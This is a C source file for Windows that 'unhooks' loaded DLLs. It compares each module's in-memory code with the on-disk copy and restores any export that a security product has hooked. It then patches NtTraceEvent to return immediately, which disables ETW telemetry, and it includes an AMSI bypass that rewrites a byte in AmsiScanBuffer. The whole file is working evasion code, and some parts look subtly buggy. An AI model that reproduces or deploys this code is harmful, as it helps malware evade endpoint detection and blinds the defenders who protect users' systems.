#include "header.h"
int ListDllFunctions(const unsigned char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, PCHAR size_text_infile, PCHAR addr_text_infile, PIMAGE_SECTION_HEADER pSecHdr_inmem, PIMAGE_SECTION_HEADER pSecHdr_infile) {

	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
		if (ret == 0) {
			printf("VirtualProtect failed\n");
			exit(-1);
		}
	}


	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	PIMAGE_DOS_HEADER dosHeader_infile = (PIMAGE_DOS_HEADER)baseAddress_infile;
	if (dosHeader_infile->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	PIMAGE_NT_HEADERS ntHeaders_infile = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_infile + dosHeader_infile->e_lfanew);
	if (ntHeaders_infile->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	PIMAGE_EXPORT_DIRECTORY exportDirectory_infile;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportDirRVA_infile = ntHeaders_infile->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_infile == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);
	exportDirectory_infile = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_infile + exportDirRVA_infile);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);
	DWORD* nameRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);
	DWORD* functionRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);
	WORD* ordinals_infile = (WORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNameOrdinals);

	printf("Exported functions from %s:\n", dllPath);
	if (exportDirectory_infile->NumberOfNames != exportDirectory_inmem->NumberOfNames) {
		printf("Error in number of names. File has %d names while mem has %d name\n", exportDirectory_infile->NumberOfNames, exportDirectory_inmem->NumberOfNames);

		FILE* log_infile = fopen("C:\\Users\\sebastien.carre\\log_infile.txt", "w");
		FILE* log_inmem = fopen("C:\\Users\\sebastien.carre\\log_inmem.txt", "w");

		printf("Loggind %d entries for FILE\n", exportDirectory_infile->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
			unsigned char* functionName_infile = (unsigned char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
			fprintf(log_infile, "%s\n", functionName_infile);
		}
		printf("Loggind %d entries for MEM\n", exportDirectory_inmem->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {
			unsigned char* functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
			fprintf(log_inmem, "%s\n", functionName_inmem);
		}
		fclose(log_infile);
		fclose(log_inmem);

		//exit(-1);
	}
	int nb_function_modified = 0;

	unsigned char** addr_inmem_c = malloc(5000 * sizeof(unsigned char*));
	unsigned char** functionName_inmem_c = malloc(5000 * sizeof(unsigned char*));
	if (addr_inmem_c == NULL || functionName_inmem_c == NULL) {
		printf("NULL argv\n");
		exit(-1);
	}

	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		unsigned char* functionName_inmem;
		unsigned char* functionName_infile = (unsigned char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);

		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory");
			exit(-1);
		}




		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
		unsigned char* addr_infile = (unsigned char*)((BYTE*)baseAddress_infile + functionRVAs_infile[ordinals_infile[i]]);




		if ((long long)addr_infile >= (long long)addr_text_infile && (long long)addr_infile < ((long long)addr_text_infile + size_text_infile)) {
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (addr_inmem[0] != addr_infile[0]) {
				int count = 0;
				while (count < 50)
				{
					if (addr_inmem[count] == addr_infile[count] && addr_inmem[count + 1] == addr_infile[count + 1] && addr_inmem[count + 2] == addr_infile[count + 2])
						break;
					count++;
				}



				//if (pSecHdr_inmem == NULL || pSecHdr_infile == NULL)
				//{
				printf("function %s (%p) in %s is modified. Restart at offset %d : ", functionName_inmem, addr_inmem, dllPath, count);
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_inmem[i]);
				}
				printf(" was ");
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_infile[i]);
				}
				printf("\n");

				//}
				if ((unsigned char)addr_inmem[0] != 0xE9) {
					printf("\t\tWARNING not E9 jump\n");
				}
				else {



					if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
						for (int i = 0; i < count; ++i) {
							addr_inmem[i] = addr_infile[i];
						}
					}
				}


				nb_function_modified++;
				//exit(-3);
			}

		}
	}
	if (nb_function_modified > 0)
		printf("\t\tNumber of function modified in %s : %d/%d\n", dllPath, nb_function_modified, exportDirectory_infile->NumberOfNames);
	printf("\n\n\n");

	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret;
		ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, oldProtection, &oldProtectionafter);
		if (ret == 0) {
			printf("VirtualProtectfailed\n");
		}
	}
	return nb_function_modified;

}


void CompareTextSection(PTCHAR szModName, unsigned char* infile, LPVOID BaseOfDll, DWORD* ret_size_text_inmem, PCHAR* ret_addr_text_inmem, DWORD* ret_size_text_infile, PCHAR* ret_addr_text_infile) {

	
	PIMAGE_DOS_HEADER dosHdr_inmem = (PIMAGE_DOS_HEADER)BaseOfDll;
	PIMAGE_NT_HEADERS ntHdr_inmem = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_inmem->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_inmem = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));

	
	size_t sPeSize;
	unsigned char* pPeAddress = infile;
	PIMAGE_DOS_HEADER dosHdr_infile = (PIMAGE_DOS_HEADER)pPeAddress;
	PIMAGE_NT_HEADERS ntHdr_infile = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_infile->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_infile = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));
	


	
	DWORD size_text_infile = 0;
	PCHAR addr_text_infile;
	for (int i = 0; i < ntHdr_infile->FileHeader.NumberOfSections; i++) {
		unsigned char sectionName[9] = { 0 };
		strncpy(sectionName, (unsigned char*)pSecHdr_infile[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_infile = (ULONG_PTR)pPeAddress + pSecHdr_infile[i].PointerToRawData;
			size_text_infile = pSecHdr_infile[i].SizeOfRawData;
			break;
		}
	}

	DWORD size_text_inmem = 0;
	PCHAR addr_text_inmem;
	for (int i = 0; i < ntHdr_inmem->FileHeader.NumberOfSections; i++) {
		unsigned char sectionName[9] = { 0 };
		strncpy(sectionName, (unsigned char*)pSecHdr_inmem[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_inmem = (ULONG_PTR)BaseOfDll + pSecHdr_inmem[i].VirtualAddress;
			size_text_inmem = pSecHdr_inmem[i].SizeOfRawData;
			break;
		}
	}


	if (size_text_infile != 0 && size_text_inmem != 0 && size_text_infile == size_text_inmem) {
		*ret_addr_text_infile = addr_text_infile;
		*ret_size_text_infile = size_text_infile;
		*ret_addr_text_inmem = addr_text_inmem;
		*ret_size_text_inmem = size_text_inmem;
		//Sleep(10000);		

		if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
			printf("Patching...\n");
			ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, pSecHdr_inmem, pSecHdr_infile);
			printf("Check :\n");
			if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
				printf("FAILED UNHOOK\n");
				exit(-1);
			}
		}
		return;
	}
	else {
		printf("Error sizes are incorrect");
		exit(-1);
	}
}

void ListLoadedModules() {
	HANDLE processHandle = GetCurrentProcess();
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;


	TCHAR current_bin_path[1024];
	DWORD size = GetModuleFileName(NULL, current_bin_path, 1024);


	if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			MODULEINFO modInfo;
			TCHAR szModName[MAX_PATH];

			if (GetModuleInformation(processHandle, hMods[i], &modInfo, sizeof(modInfo))) {
				if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
					if (strcmp(current_bin_path, szModName) != 0) {

						DWORD size_text_inmem;
						PCHAR addr_text_inmem;
						DWORD size_text_infile;
						PCHAR addr_text_infile;

						size_t sPeSize;
						printf("->\n");
						unsigned char* infile = get_file(szModName, &sPeSize);
						if (infile == NULL) {
							printf("Ignoring %s\n", szModName);
							continue;
						}
						else {
							printf("Analysing %s\n", szModName);
						}
						CompareTextSection(szModName, infile, modInfo.lpBaseOfDll, &size_text_inmem, &addr_text_inmem, &size_text_infile, &addr_text_infile);


						if (strstr(szModName, "ntdll.dll") != NULL) {
							if (patch_etw(modInfo.lpBaseOfDll) == 1) {
								if (patch_etw(modInfo.lpBaseOfDll) != 0) {
									printf("Patch etw didn't worked\n");
									exit(-1);
								}

							}
							else {
								printf("Error in patch etw. The function is not found");
								exit(-1);
							}
						}

						if (strstr(szModName, "amsi.dll") != NULL) {
							printf("[DEBUG] : AMSI has been found. I expected not to be found\n");
							exit(-1);
							if (patch_amsi(modInfo.lpBaseOfDll) == 1) {
								if (patch_amsi(modInfo.lpBaseOfDll) != 0) {
									printf("Patch amsi didn't worked\n");
									exit(-1);
								}

							}
							else {
								printf("Error in patch amsi. The function is not found");
								exit(-1);
							}
						}
					}
				}
			}
		}
	}
}
int patch_etw(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;



	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {


		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);




		if (strcmp(functionName_inmem, "NtTraceEvent") != 0) {
			continue;
		}
		printf("  ** NtTraceEvent IS FOUND :) **\n");
		if (addr_inmem[0] != 0xc3) {
			status = 1;
			VirtualProtect(addr_inmem, 1, PAGE_EXECUTE_READWRITE, &oldProtection);
			printf("%x -> ", addr_inmem[0]);
			addr_inmem[0] = 0xc3;//RET instruction
			printf("%x\n", addr_inmem[0]);
			VirtualProtect(addr_inmem, 1, oldProtection, &oldProtectionafter);
			printf("NtTraceEvent patched !\n");
		}
		else {
			printf("NtTraceEvent is already patched\n");
		}



	}
	return status;


}
int patch_amsi(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;



	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {


		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);




		if (strcmp(functionName_inmem, "AmsiScanBuffer") != 0) {
			continue;
		}
		printf("  ** AmsiScanBuffer IS FOUND :) **\n");
		if (addr_inmem[0x83] != 0x74) {
			status = 1;
			VirtualProtect(&addr_inmem[0x83], 1, PAGE_EXECUTE_READWRITE, &oldProtection);
			printf("%x -> ", addr_inmem[0x83]);
			addr_inmem[0x83] = 0x74;//RET instruction
			printf("%x\n", addr_inmem[0x83]);
			VirtualProtect(&addr_inmem[0x83], 1, oldProtection, &oldProtectionafter);
			printf("AmsiScanBuffer patched !\n");
		}
		else {
			printf("AmsiScanBuffer is already patched\n");
		}



	}
	return status;


}

int main_unhook(int argc, char* argv[]) {
	ListLoadedModules();
	return 0;
}
